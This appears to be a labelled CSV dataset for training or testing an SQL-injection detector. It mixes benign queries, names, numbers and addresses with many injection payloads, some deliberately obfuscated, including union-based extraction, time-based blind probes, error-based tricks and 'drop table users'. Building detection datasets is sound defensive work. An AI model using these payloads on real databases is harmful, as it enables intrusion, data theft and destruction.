Query,Label,cluster,stratify_col
"1'   )%  ) }  
     &&Ã¢Â     extractvalue ]( 
(select 0x0f2e),concat  (  0x4c,0x7131806a53, ;(  select  ;(/**/ elt ;(/*;o?sp>dgtlh*(select (select 0x4))*/@8b0x1f2e like (select (select 0x6f2e)),0b0x6{  ) like] )     ) <,0b0x2x2e7a767a1o0b0x4x0o0o6b /**/ )!< ?)  , and    ( 
 )(.  'mwyu'='mwyu",1,9,1_9
"%u0027%u0020and%u00201=convert(int,@@version)%u0020o/**/r%u0020(1)--",1,2,1_2
waitfor delay '0:0:5'--#r1vjx8e6p,1,0,1_0
select gravity ( s ) from favorite inner join,0,1,0_1
select min ( thick )  as stomach from poor,0,1,0_1
"   select employees.stretch, count ( orders.reviewid )  as springfrom    ( ordersinner join took on orders.improveid  =  employees.hurtid ) ",0,1,0_1
select count ( took ) from sitting,0,1,0_1
8629,0,3,0_3
select * from nice,0,5,0_5
"0o0b0b1101111x6o7b0b0b0b1701110o0o0o0b0o3x2o10x0o0b0o0o0b0b1110101'[;):	Ã¢Â unionall\select-null,null,null,null,null,null--",1,2,1_2
"select strcmp ( ""sql tutorial"",   ""html tutorial"" ) ;",0,2,0_2
7608,0,3,0_3
"8o0b80%"" ) ] rlike *)()\select**;from   (
 select ](  sleep` (! (select 8o9o8o2)  [)    )  .  )  vwyq& ) ?  &&  'w' not  like  'wj'!andtrueÃ¢Â and true and true and (select (select 0x1dc0)) not = 0x1dc1#n2qoso",1,2,1_2
 (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,1,4,1_4
select * from differ where blanket = 'bet',0,5,0_5
6360910000000000,0,3,0_3
" select * from users where	id   like ^(select 8) or 0x5
or:(select 0) or ""q>""!=""q>"" and true#""; union}select 'a',version  (	 > )   --	0o0o0gg",1,2,1_2
"0b0o0o24%""and}(select (select 0o17205)) like  &(\ select count '(
 *` )   from^sysibm.systables as t1,sysibm.systablesas t3o0o0b14,sysibm.systables^as t0o1  )   or  false or-0b10011000010  like ?(select 0o2303) .and  0x43a=0x45a or (select (select!(select (select 0x0)))).or (select (select 3079)) not  like  (select 0b0b0b110100111101111110011100011101111001100101111111101100001110001111111110000100100100100100011101111111101111111100001011) and 2100 like 2100 and '/'<>'/,' --",1,0,1_0
"1'/**/union				select				table_name,				null,				null				from				information_schema.tables				--#0m7ae",1,4,1_4
"1'} ) +$and?extractvalue  ( ;0x0x9x1ede,concat| (  0o0o1x0c,0x0x8d8213a0o107,  (!Ã¢Â select   ( [elt  (\ 0b0b0x5o8x7c9o0x0e< $like  )9x1f0b1081e,0b0b0x2x1)+_)~]:+)  /**/  )  ,0x5b1011001711a0xa7a0o107   )* \)/*|z(g[(select (select (select;(select (select (select 0))))))zzl [*/. ",1,2,1_2
"0b2b0b1""~ ), as\ktnq	where|(select<(select	0o21555))@/**/=/*f;?ff*/0x4o21455",1,2,1_2
98089077b,0,3,0_3
18440,0,3,0_3
f36hu1a,0,8,0_8
baladora,0,8,0_8
exists(select1fromusers)--,1,4,1_4
" select * from promised order by there, bet",0,7,0_7
 update win set affect = 'zero'where must = 'slave',0,5,0_5
4.10842e+015,0,3,0_3
"1%u0027%u0020or%u0020if(substring(database(),%u00201,%u00201)like%u0027a%u0027,%u0020sleep(5),%u00200)%u0020----68t8k49lvznzt",1,2,1_2
"1"" and   (  3020  =  3020  )  *6703 and ""tnzp"" like ""tnzp",1,2,1_2
"1""""where	(select 0xf0b1010101)=9973 && 0b11111010110  =
 2006",1,6,1_6
select min ( walk )  as exactly from substance,0,1,0_1
"   select fence,discover,syllable,those,coast     (  (  shoot join strike on exist.near =  basis.market )   inner join rhymeon orders.table =  torn.roseid ) ",0,1,0_1
'/**/o/*!*/r/**/'1'>='1,1,9,1_9
"1' in boolean mode  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
"5'   )   :)  )  )  }or char  (  (select (select (select 0b0x136)))~ )   or char%/*(select (select]0x3))}o'c	l<yth\u0%(select (select (select (select (select (select 7))))))i^b^m`uz*/(  (select (select 0b10110101))  )   or  |char  (` 2x88  ) ; or~char  ( }0x67  )    like@ regexp_substring }(  repeat  (  left  (! crypt_key/ (  char  (  (select (select)0x42))  )    or char  (	 (select	(select 0b0x3c))  )@  or char  () 0b0x53 $) [,null  )~ ,0x0  )  ,0x1e0o65ae60  )  ,null  )    &&    	( <  (   $ (  'nlky'=like 'nlky",1,4,1_4
select * from pride fetch first 50 percent rows onlyselect top 3 * from grandfather,0,0,0_0
select avg ( except )  from speak  select sum ( sang ) ,0,1,0_1
"c/ madrid, 53 5-f",0,0,0_0
1'  )   as tsge where 6970  =  6970,1,6,1_6
"'/*!*/union		select		1,2,3		or		(1)--",1,4,1_4
"calle carlos amel, 32, 12?h",0,0,0_0
"1' or if(substring(database(), 1, 1)<='a', sleep(5), 0)  -- random_noise--",1,9,1_9
"-5278""   )    )     )   union all select 5264,5264,5264#",1,4,1_4
"1'        union        select        table_name,        null,        null        from        information_schema.tables                or        'b'	=	'b'--",1,9,1_9
46145,0,3,0_3
test' or '1'='1' -- --nqa3c26u8,1,9,1_9
select * from size where later = 'discuss' fetch first 3 rows only,0,5,0_5
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""zptu""  =  ""zptu",1,4,1_4
"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",1,6,1_6
"select productname, unitprice *  ( unitsinstock + iif ( isnull ( unitsonorder ) , 0, unitsonorder  )  )   from products;",0,1,0_1
select * from  ( select remove from community ) ,0,7,0_7
"'||(1=1)'1'='1/*!*/and1=1/*
*/",1,9,1_9
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',1,9,1_9
4'+| (; select:tzvm.where/**/(select 4145)  =- 9o92831~&& 0x1060  like ;0x3d0d  ; or (} (select(select (select (select 0))))#uf(,1,4,1_4
soman,0,8,0_8
herminda,0,8,0_8
' or '1'='1,1,9,1_9
1'  )   where 7908  =  7908 or sleep  (  5  )  --,1,6,1_6
"1""!<))/*!~/be*/where (select (select 3679))!*likeÃ¢Â  0b111001011111",1,2,1_2
'/**/and 1=1/**/--/**/#vytp5d1,1,6,1_6
"1' where 2025  =  2025 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1_1
1 where 7254  =  7254,1,6,1_6
select * from load where very = 'secret',0,5,0_5
"extractvalue(1,concat(0x5c,version()))--#xareu5natfkr0xp",1,0,1_0
waitfor/**/delay/**/'0:0:5'/**/--/**/random_noise--,1,0,1_0
"6b8o1'@^ or    *( &select 'jmhb' where 0x31a
 like  (select 0x9d0x62) or (selectÃ¢Â (select 0x1090)) =   |(  select 4x1394 from pg_sleep (  (select<(select 0x0b109))   )    ){    &&   true and (select (select (select 0x1)))  or  false and '? or false or false or ""y"" like~""yw"" or.false and true and (select 1) and true or false or false#' not like '?#q' --g2qlquy",1,2,1_2
select hidden ( s )  from rest union,0,1,0_1
select expression from organized,0,7,0_7
"  select placeid as id, fix as held from early",0,7,0_7
" select left ( customername, 5 )  as extractstring from customers;",0,4,0_4
"1   )    )     )   union all select null,null,null--",1,4,1_4
4 or   (  select * from   (  select #(  sleep  (  (select (select (select (select 0x5))))   )    )     )  ydpu  )  # lwfs%o,1,4,1_4
"  select ants as pen, worse as [aloud]  from sky",0,7,0_7
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',1,9,1_9
"  select * from customers   where country not in  ( 'germany', 'france', 'uk' ) ; ",0,5,0_5
test'/*!*/or '1'='1' /*#w2qufvim62gjvt0,1,9,1_9
19310,0,3,0_3
"0x0b1'.and""0x0b0o2334}=/*r8b*/^3345",1,2,1_2
19140,0,3,0_3
")select * from users%whereid, like
 (select (select 1)) or)""]0x0o3o1""+or:(select (select`(select 1))) /**/like"" 0x6   or_  ""v6t"" like ""v7to""+-- 1rpe",1,2,1_2
"  select locate ( ""com"", ""w3schools.com"", 3 )  as matchposition;",0,2,0_2
"1%u0027%u0020and%u0020substring(database(),%u00201,%u00201)%u0020	=	%u0020%u0027s%u0027%u0020--",1,2,1_2
select correctly ( s ) from wave inner join,0,1,0_1
"9'+  (  select 'drvv' where (select 0b0b1110101100101111010100000101101111011111)=(select 0x15f6)/*{grtbj*/and (select 0xdff)  like /  (/**/ select count (  *  ):< from domain.domains+as{t0b101,domain.columns as	t2,domain.tables as?t3  )    and   '{'<>'{k' or ""t""<>""t"" or
0x0 or 0b1101111111001=0b1101111111010 or false --",1,2,1_2
"c/ torre, 23",0,0,0_0
delete from explain where dollar = 'cake',0,5,0_5
"c/ del ferrocarril, 152,",0,0,0_0
humaina,0,8,0_8
1' where 2145  =  2145,1,6,1_6
"1'/**/or   (  select 'xuof' from dual where (select0b10001001011011)  =/*;1v*/ (select 0b0b10010001100010010000000001001101000110101010) or 0b1111111010110    like      (  select count  (, *  )   from generate_series  (  0x0o0o1,(select (select 5000000))   )    )
 /**/--",1,4,1_4
select  ^(  casewhen   (  (select 0x0eac)   like  	(select 8b9x1d34) ~)  	then^0o17245 else 0x0o0x7x0o1eac* '(  select (select (select 0x4eac))from mysql.db  )   end{+)      or   'fz' <> 'fz'\and]true or false and true#l.p\zxgm/,1,2,1_2
"5%""   ) }  ) ; , )  	?and  (select 0x1822). like  utl_inaddr.get_host_address  (  chr  (\ 0x139  )  ||chr 	(/ (select/*mh~n+)htr:\h(st rg*/(select[(select 113)))  )    or  chr  (  0b3x5o8x0fa  )`?||chr  (  9x6a  )/	 or chr  (  0o102  ) or ( ;select  '(  case when } (  (select (select (select (select 4389))))  =	 0x1022+ )  %then (select (select (select (select (select (select 1)))))) else (select (select_8o6)) end  )   from dual  )   or chr  ( \0x0b4xf468c  )  ||chr  ($	(select (select 0x5c))  )  ||chr  (  (select (select 0x76))  )    or  chr  ( !(select 0x0b0o7a)  )   or chr  (  (select (select 198)) 	 )    )    and<,  (    (  /*b/1bw<6*/  (. ""%""=""",1,4,1_4
select count ( wantid ) from yesterday,0,1,0_1
select * from me where birds = 'silk'  or experience = 'neighborhood',0,5,0_5
select   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  select 6002 from mysql.db  )   end  )  #,1,4,1_4
select income ( s ) from tiny inner join,0,1,0_1
1  )   and 3659  =  5475 and   (  8949  =  8949,1,6,1_6
select line ( s ) from dot inner join,0,1,0_1
select * from worried where badly = 'week' fetch first 3 rows only,0,5,0_5
"1""  )   as ranl where 5553  =  5553",1,6,1_6
"8x0b0o0x1%"" )/*n|j~Ã¢Â 7b/{fkvri &&:""+ojvo""=""+ojvo""<or(false  or  false#m}&a*/?~union all	select_null*and[0o7x8b901x5~and*0x0o0o1 and
(select (select (select 0x1))) and	0x5\or false#0x4/adq?z",1,2,1_2
"1)unionselect1,database(),3--/*
*/",1,0,1_0
test'/**/or/**/'1'	=  '1'/**//*/**/and/**/'a'	=  'a',1,9,1_9
' or '1'='1#j3epgwsg0zmh,1,9,1_9
"1'  )   as najc where 5213  =  5213 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,4,1_4
"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226",1,4,1_4
"1%"" or updatexml  (  (select (select (select (select 1878)))),concat  (  5x2e,0o6x0b0b11011010110131001111010a0o107,  (  select   (  elt;(  (select (select (select 0x710))) >like  (select^0x79a),(select 0o0x1) 
 )   <)?    ), ,0x0o0x527a767a71 `) Ã¢Â ,0x6o100da/**/ )!   and  ""%""  =/**(bd6; ul*/ """,1,4,1_4
'			or			1 =	1			--,1,6,1_6
"1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
2300,0,3,0_3
leshowit,0,8,0_8
jaln de cameros,0,0,0_0
"1"" where 1115  =  1115 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
"1  )    or  (select (select (select (select 0x25ab))))<	=   (  select count `(  * )  ^from<domain.domains asÃ¢Â t0x3,domain.columns*as@t0b0x3xa,domain.tables as_t5o3  )  )and   (% (select (select 0b121011500110))  like Ã¢Â 3814",1,2,1_2
"1""  )   as crek where 6570  =  6570 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
'/**/or/**/'1'<='1/**/--/**/random_noise,1,9,1_9
"8b1""
and)(select 0x20d0x7) =; Ã¢Â ( }select count  (~* ~)-: from~generate_series  (  1x0b0x8,(select (select (select 0x4c4b49))) }):  `)    and}""eslo"" like ""eslo",1,2,1_2
8n66ies4a,0,3,0_3
sabety,0,8,0_8
select yourself from fair,0,7,0_7
admin'/*!12345*/or '1'='1--1g6fpeil7nxh84,1,9,1_9
%u0027%u0020||%u0020exists(sel/*!12345*/ect%u00201%u0020from%u0020users)--,1,2,1_2
select * from sugar where south between '1996-07-01' and '1996-07-31',0,5,0_5
harrold_elloy@santacruzdelvoto.ci,0,0,0_0
"~selectÃ¢Â sleep|($*0b0o8b8b0o5o0b100
_)_$ and~""cyrb""/*py&u*/like.""cyrb",1,2,1_2
select * from easy 3 select * from look,0,5,0_5
1   )    )    as zykv where 2158  =  2158,1,6,1_6
"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",1,4,1_4
select * from or where may = 'box' limit 3,0,5,0_5
1'  )   as fkpn where 1100  =  1100,1,6,1_6
aldeanueva de santa cruz,0,0,0_0
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc",1,4,1_4
"1""Ã¢Â _ )
   ), +*as ihfw""where 0b7x3b5  like  (select 0o0xc89) andÃ¢Â 0x207d  like  dbms_pipe.receive_message  (  chr 	(  0o801<)   or chr  (']0x4f  )    or  chrÃ¢Â  (,;(select (select (select (select (select 918)))))  )   or|chr\ (  0x44-/*|fu.f*/)  ,0x5  )>  or  (select (select (select 0x2))) or false or	(select 0o0b0)  or\ false or/**/false and 'wmqc
' not like 'wmqc
t':and true  or  'w z&<';not='w z&<' and true  &&  (select (select 1)) and 0o1 and true*or false or 0 --",1,2,1_2
"-3633'  )   where 3513  =  3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",1,4,1_4
"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",1,9,1_9
"1Ã¢Â ""\)	 [ )(!$:as\sfanwhereÃ¢Â 0b0x1d2b0x0xac0x8ea  like/*4;<u*/ 0x1x1c0o2+and(select0x1e0b1011001)/|like8658",1,2,1_2
"
select * from users where id = 0x7 or (select (select (select 0))) or '0-"";'='0-"";~' and true or (select 0) or false  and  true#""$
union select null,version  (    )   -- 0x1",1,4,1_4
"3""{  )  	 )/**/Ã¢Â    ) &&~(  select * fromÃ¢Â   (&select .(  sleep  (  (select (select (select (select (select 0x0o3)))))   )    )     )  fzno  )?  and!; (    (     (  ""jenb"" like&""jenb",1,2,1_2
select min ( right )  as different from factor,0,7,0_7
from  ( select distinct taught from roof ) ,0,7,0_7
1   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   7594  =  7594,1,4,1_4
"  select * from cotton where kids not in  ( 'within', 'connected', 'pattern' )  ",0,5,0_5
"1and/*
*/1=1/*
*/",1,6,1_6
"calle hemingway, s/n",0,0,0_0
"1   )    )    as skex where 0b0b0x1f0o5  like ;(select_(select&(select
(select 0x1f8)))) and sleep> ($ (select (select 0x5))  )   and Ã¢Â true	or}""v""]not like=""v"" or 8xe0a like (select 5b111304101101) and/**/true and true or false; &&  true
--",1,2,1_2
"
select sleep  (?[(select 6x0o10)< )) +and: ( /*vnw ;o*/""%""=""",1,2,1_2
"select	count>+(*)*	*)`&$from^all_users
t0o8,all_users{t0b0x0x0x0b10,all_users/*us)	yf5*/t0b0b10o2b0o63,all_userst0x0b0b1119101101,all_users+t0o0b0b1000o1o0o0x5x5%     && :+?
<+[*?(<'""vabm"",;=
]""vabm",1,2,1_2
p81i4uer3o,0,8,0_8
"1',  ( select   (  case when^  (; (select 4x1091)  like  (select 0o0b11070610105115)  ) +then*0b0b3?else cast  (  0x0o11^as int  )  /( ( 	select<0o0 from dual  )   end$ )  `from?dual +)/ ",1,4,1_4
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'ymad' like 'ymad",1,9,1_9
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1,9,1_9
select * from automobile where getting = 'move'  or development = 'paid',0,5,0_5
'					or					1/**/ =	1										or					'b'  =	'b'--					#vju3pe,1,9,1_9
chlud_kumvongse@encuentrodominios.sd,0,0,0_0
' or '1'='1--2onk30f,1,9,1_9
"1' or if(substring(database(), 1, 1)like'a', sleep(5), 0)  /*!*/and 1=1----98agia8i",1,6,1_6
select count ( anyone ) from mistake,0,1,0_1
'/**/or/**/'1'  >=	'1,1,9,1_9
select * from statement where worker  between 10 and 20,0,5,0_5
select * from practice where discovery = 'over'  or scared = 'fifty',0,5,0_5
select scientific from many,0,7,0_7
"1'a/*!12345*/ndsubstring(database(),1,1)='s'
--",1,9,1_9
"-3234%""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""%""  =  """,1,4,1_4
select * from handsome fetch first 3 rows only select top 50 percent * from except,0,5,0_5
" select * from<users where id} like  '4'  or    (/ \.Ã¢Â /*c*r\`&[k*/)    like  0b1001x3x1union<select (select (select (select (select (select 0b1))))),@@version]and '@{z'[!=''@{zz' andÃ¢Â '{i' [like ""'{i'or (select (select 2x5))-- 9x0b9b2'v  or Ã¢Â false or (select (select (select 0x0))) or false orÃ¢Â 'z]o'!='z]o' or false  or  'b/' not like 'b/' or false or false or (select 0)#yz$a>b{",1,2,1_2
select count ( flies ) from whispered,0,1,0_1
"test'or
'1'='1'",1,9,1_9
par4u8i67t3,0,8,0_8
select * from engineer fetch first 50 percent rows onlyselect top 3 * from goes,0,0,0_0
mozek,0,8,0_8
waitfor delay '0:0:5'-- thuo,1,0,1_0
'/**/or/**/'1'='1/**/and/**/'a'='a',1,9,1_9
select * from period,0,5,0_5
5907,0,3,0_3
select becoming ( s )  from terrible union,0,1,0_1
"selectpg_sleep. (!+(select!8x0b0o0o0x0x2b10591001), )   and    ( ;  (;'   (  ""%""=""",1,2,1_2
1 and 1=1,1,6,1_6
"1' xor substring(database(), 1, 1) in (1) 's' --#9lh23ldsl070rp",1,9,1_9
pistan robredo,0,8,0_8
%u0027%u0020||%u0020%u00271%u0027=%u00271,1,2,1_2
"insert into something  ( figure, sail, mad )  values  ( 'announced', 'example', 'very' )  ",0,1,0_1
"2',`)
`:$or:	derÃ¢Â by&(select:5x0x5x0)--",1,2,1_2
1   )    )    as prxq where 4600  =  4600,1,6,1_6
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,5,1_5
select count ( excitedid ) from giant,0,1,0_1
waitfor/*!12345*/delay/**/'0:0:5'--,1,0,1_0
delete from whatever,0,7,0_7
1%'   )    )     )   and   (  9404  =  8390  )  *8390 and    (    (     (  '%'  =  ',1,9,1_9
select * from tightly where negative  between 10 and 20,0,5,0_5
;/**/drop/**/table/**/users;/**/--#4lfh1c,1,0,1_0
' or exists(select 1 from users)----4v01fqn83i,1,4,1_4
04607227m,0,3,0_3
";drop
table
users;
--",1,0,1_0
";selectÃ¢Â * from""users where id  like  (select\0o0b1) or ""\ and (select	(select (select 5243))) <>`4909 and true)or ""h+$w"" not like ""h+$w"" or 0#""    or    (select 1) like (select 0x7) --/*igf?(*/2o1!ssyi",1,2,1_2
"1   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  9462  =  9462",1,1,1_1
"1) union select 1,database(),3--",1,4,1_4
"1%u0027unionselecttable_name,null,nullfrom
information_schema.tables----jsgj5",1,0,1_0
"select * from generate_series  (  0b111110210110,(select (select 3995)),case when  (/**/ (select 0xf96)&<like  (select 9597)  )  then 3b6o0x0x1 else (select 0) end  )_  limit 0o1--",1,4,1_4
